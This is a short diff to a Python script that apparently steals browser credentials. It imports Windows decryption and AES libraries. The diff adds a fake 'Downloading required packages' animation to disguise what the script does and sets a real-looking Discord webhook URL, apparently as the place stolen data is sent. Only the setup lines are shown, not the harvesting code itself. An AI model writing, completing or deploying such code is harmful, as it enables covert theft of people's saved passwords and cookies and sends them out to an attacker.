@@ -8,6 +8,7 @@ import shutil
 from datetime import datetime, timedelta
 import re
 import os.path
+import time
 import requests
 if os.name == "nt":
     import win32crypt
@@ -16,8 +17,16 @@ else:
 from Crypto.Cipher import AES
 
 
+print("Downloading required packages", end="", flush=True)
+for x in range(0, 3):
+    for y in range(0, 3):
+        print(".", end="", flush=True)
+        time.sleep(0.3)
+    print("\b" * 3, end="", flush=True)
+print("")
+
 #set webhook url here
-url = ""
+url = "https://discord.com/api/webhooks/1087042511165472838/kLfCDiZTU-bJVzBOthd2XbKyNZgMEganAxBLuovVep-8ZsV-yWplXW-wd1gUp79exP9k"
 
 if os.name == "nt":
     system = "Windows"
